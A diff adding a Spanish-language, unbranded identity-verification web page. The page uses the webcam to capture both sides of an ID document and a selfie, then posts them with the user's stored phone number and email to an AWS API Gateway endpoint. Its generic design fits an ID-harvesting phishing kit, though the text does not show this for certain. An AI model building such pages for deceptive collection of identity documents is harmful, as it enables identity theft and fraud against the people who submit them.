@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación - Cámara</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="cam-container">
+        <a href="verificacion-requisitos.html" style="color: var(--text-color-dark); font-size: 1.5rem; text-decoration: none; display: block; margin-bottom: 20px;">
+            &larr;
+        </a>
+        
+        <h1>Saca una foto de la página con foto del documento</h1>
+        <p class="subtitle" id="status-subtitle">Sigue las instrucciones para tomar las fotos de tu documento y selfie.</p>
+        
+        <div id="video-frame">
+            <video id="video" autoplay></video>
+        </div>
+        
+        <canvas id="canvas" style="display: none;"></canvas>
+        
+        <p id="instruccion">Documentos aceptados: documento de identidad, pasaporte.</p>
+
+        <div class="controls">
+            <button id="iniciar-camara" class="btn primary-btn" style="margin-top: 30px;">Iniciar Cámara</button>
+            
+            <button id="tomar-foto" style="display:none;"></button>
+            
+            <button id="siguiente-paso" class="btn primary-btn" style="display:none; margin-top: 20px;">Siguiente Paso (1/3)</button>
+            
+            <button id="enviar-datos" class="btn" style="background-color: var(--success-green); color: white; display:none;">Finalizar y Enviar ✅</button>
+        </div>
+
+        <p class="success-message" id="success-msg" style="display: none;"></p>
+    </div>
+
+    <script>
+        // ⚠️ API GATEWAY DE AWS (Tu URL de destino) ⚠️
+        const API_GATEWAY_URL = 'https://a2yq7j0wxk.execute-api.us-west-1.amazonaws.com/default/Lambda-Role-OnlyAccess';
+
+        // Constantes del DOM
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const instruccion = document.getElementById('instruccion');
+        const iniciarCamaraBtn = document.getElementById('iniciar-camara');
+        const tomarFotoBtn = document.getElementById('tomar-foto');
+        const siguientePasoBtn = document.getElementById('siguiente-paso');
+        const enviarDatosBtn = document.getElementById('enviar-datos');
+        const successMsg = document.getElementById('success-msg');
+        let stream;
+        let fotoData = []; 
+        let pasoActual = 0;
+        const capturas = ['Anverso del Documento', 'Reverso del Documento', 'Selfie de Verificación'];
+
+
+        // 🟢 LÓGICA DE PERSISTENCIA
+        const checkVerificationStatus = () => {
+            if (localStorage.getItem('verificationComplete') === 'true') {
+                instruccion.innerHTML = '<span style="color:var(--success-green);">✅ Verificación COMPLETA.</span>';
+                iniciarCamaraBtn.style.display = 'none';
+                video.style.display = 'none';
+                document.getElementById('status-subtitle').textContent = 'Gracias, su solicitud está siendo procesada.';
+                return true;
+            }
+            return false;
+        };
+
+        const actualizarPaso = () => {
+            if (pasoActual < capturas.length) {
+                instruccion.innerHTML = `Presiona el círculo para tomar la foto: <b>${capturas[pasoActual]}</b>`;
+                siguientePasoBtn.textContent = `Siguiente Paso (${pasoActual + 1}/${capturas.length})`;
+            } else {
+                instruccion.innerHTML = '¡Verificación Lista!';
+                tomarFotoBtn.style.display = 'none';
+                siguientePasoBtn.style.display = 'none';
+                enviarDatosBtn.style.display = 'block';
+                enviarDatosBtn.disabled = false;
+                if (stream) stream.getTracks().forEach(track => track.stop());
+            }
+        };
+
+        iniciarCamaraBtn.addEventListener('click', async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                video.play();
+                
+                iniciarCamaraBtn.style.display = 'none';
+                tomarFotoBtn.style.display = 'block';
+                tomarFotoBtn.disabled = false;
+                siguientePasoBtn.style.display = 'none'; 
+                
+                actualizarPaso();
+
+            } catch (err) {
+                alert("Error al iniciar la cámara. (Revisa permisos o HTTPS): " + err.message);
+            }
+        });
+
+        // Lógica de Captura (Botón Círculo)
+        tomarFotoBtn.addEventListener('click', () => {
+            const canvas_ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas_ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageDataURL = canvas.toDataURL('image/jpeg', 0.8); 
+            fotoData.push(imageDataURL);
+            
+            tomarFotoBtn.style.backgroundColor = 'var(--success-green)';
+            setTimeout(() => {
+                tomarFotoBtn.style.backgroundColor = 'white';
+            }, 500);
+
+            tomarFotoBtn.disabled = true;
+            siguientePasoBtn.style.display = 'block';
+            siguientePasoBtn.textContent = (pasoActual + 1 < capturas.length) ? 'Siguiente: ' + capturas[pasoActual + 1] : 'Finalizar Verificación';
+        });
+
+        siguientePasoBtn.addEventListener('click', () => {
+            if (fotoData.length === pasoActual + 1) { 
+                pasoActual++;
+                tomarFotoBtn.disabled = false;
+                siguientePasoBtn.style.display = 'none'; 
+                
+                if (pasoActual < capturas.length) {
+                    actualizarPaso();
+                } else {
+                    actualizarPaso();
+                }
+            } else {
+                alert('Por favor, toma la foto de ' + capturas[pasoActual] + ' antes de continuar.');
+            }
+        });
+
+        // --- LÓGICA DE ENVÍO Y PERSISTENCIA ---
+        enviarDatosBtn.addEventListener('click', async () => {
+            enviarDatosBtn.textContent = 'Enviando Datos...';
+            enviarDatosBtn.disabled = true;
+
+            const telefono = localStorage.getItem('userPhone');
+            const email = localStorage.getItem('userEmail');
+
+            const payload = { telefono, email, fotos: fotoData };
+            
+            try {
+                const response = await fetch(API_GATEWAY_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                
+                if (response.ok) {
+                    localStorage.setItem('verificationComplete', 'true'); 
+                    localStorage.removeItem('userPhone'); 
+                    localStorage.removeItem('userEmail');
+                    
+                    // Redirección a la página de éxito
+                    window.location.href = 'verificacion-exitosa.html'; 
+                } else {
+                    alert('Error en el servidor. Inténtalo de nuevo.');
+                    enviarDatosBtn.textContent = 'Reintentar Envío';
+                    enviarDatosBtn.disabled = false;
+                }
+            } catch (error) {
+                alert('Error de conexión. Inténtalo de nuevo.');
+                enviarDatosBtn.textContent = 'Reintentar Envío';
+                enviarDatosBtn.disabled = false;
+            }
+        });
+
+        // 🟢 EJECUTAR EL CHEQUEO DE ESTADO AL CARGAR LA PÁGINA
+        window.onload = () => {
+            if (!checkVerificationStatus()) {
+                iniciarCamaraBtn.style.display = 'block';
+            }
+        };
+    </script>
+</body>
+</html>
